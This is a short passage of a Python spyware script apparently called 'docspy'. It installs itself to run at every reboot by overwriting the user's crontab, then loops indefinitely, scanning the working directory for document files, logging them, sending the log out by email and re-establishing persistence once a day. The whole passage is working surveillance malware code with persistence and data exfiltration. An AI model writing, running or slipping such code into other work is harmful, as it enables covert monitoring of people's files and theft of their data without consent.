            service_name = 'docspy'
            service_command = f'echo "@reboot {os.path.abspath(__file__)}" | crontab -'
            subprocess.run(service_command, shell=True)

    # Monitor document access
    while True:
        for root, _, files in os.walk(os.getcwd()):
            for file in files:
                if any(file.endswith(ext) for ext in document_types):
                    file_path = os.path.join(root, file)
                    log_document_access(file_path)
        send_log_via_email()
        establish_persistence()
        time.sleep(86400)  # Sleep for 24 hours
